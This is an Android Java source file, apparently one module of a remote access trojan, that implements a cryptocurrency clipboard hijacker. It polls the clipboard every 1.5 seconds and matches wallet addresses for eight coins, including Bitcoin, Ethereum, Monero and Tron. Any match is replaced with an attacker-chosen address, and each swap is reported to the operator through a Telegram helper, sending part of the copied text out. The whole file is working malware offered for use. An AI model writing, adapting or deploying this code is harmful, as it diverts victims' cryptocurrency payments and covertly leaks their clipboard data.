package com.enterprise.rat.commands;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.enterprise.rat.utils.TelegramApi;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class CryptoClipboardHijackManager {
    private Context context;
    private boolean active = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastContent = "";
    // Comprehensive cryptocurrency address patterns (Bitcoin, Ethereum, Tron, Litecoin, Ripple, Monero, etc.)
    private static final Map<String, String> ADDRESS_REGEX = new HashMap<>();
    static {
        ADDRESS_REGEX.put("^(bc1|1|3)[a-zA-Z0-9]{25,42}$", "bc1qhijackedfakeaddress1234567890abc");
        ADDRESS_REGEX.put("^0x[a-fA-F0-9]{40}$", "0xHijackedFakeEthereumAddress1234567890");
        ADDRESS_REGEX.put("^T[a-zA-Z0-9]{33}$", "THijackedFakeTronAddress12345678901");
        ADDRESS_REGEX.put("^L[a-zA-Z0-9]{33}$", "LHijackedFakeLitecoinAddress12345678");
        ADDRESS_REGEX.put("^r[a-zA-Z0-9]{25,34}$", "rHijackedFakeRippleAddress123456789");
        ADDRESS_REGEX.put("^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", "4HijackedFakeMoneroAddress123456789012345678901234567890123456789012345678901234567890123456789012345678901");
        ADDRESS_REGEX.put("^D[a-zA-Z0-9]{33}$", "DHijackedFakeDogecoinAddress123456789");
        ADDRESS_REGEX.put("^bitcoincash:[a-zA-Z0-9]{42}$", "bitcoincash:HijackedFakeBitcoinCashAddress12345");
    }

    public CryptoClipboardHijackManager(Context context) { this.context = context; }

    public void start() {
        if (active) return;
        active = true;
        handler.post(monitor);
        TelegramApi.sendMessage("🔄 Crypto clipboard hijack active.");
    }

    public void stop() {
        active = false;
        handler.removeCallbacks(monitor);
        TelegramApi.sendMessage("🔄 Crypto clipboard hijack stopped.");
    }

    private Runnable monitor = new Runnable() {
        @Override
        public void run() {
            if (!active) return;
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                ClipData cd = cm.getPrimaryClip();
                if (cd != null && cd.getItemCount() > 0) {
                    String text = cd.getItemAt(0).getText() != null ? cd.getItemAt(0).getText().toString() : "";
                    if (!text.equals(lastContent)) {
                        lastContent = text;
                        for (Map.Entry<String, String> entry : ADDRESS_REGEX.entrySet()) {
                            if (Pattern.matches(entry.getKey(), text.trim())) {
                                cm.setPrimaryClip(ClipData.newPlainText("wallet", entry.getValue()));
                                TelegramApi.sendMessage("🔁 Crypto address swapped: " + text.trim().substring(0, 12) + "… → " + entry.getValue().substring(0, 12) + "…");
                                break;
                            }
                        }
                    }
                }
            }
            handler.postDelayed(this, 1500);
        }
    };
}
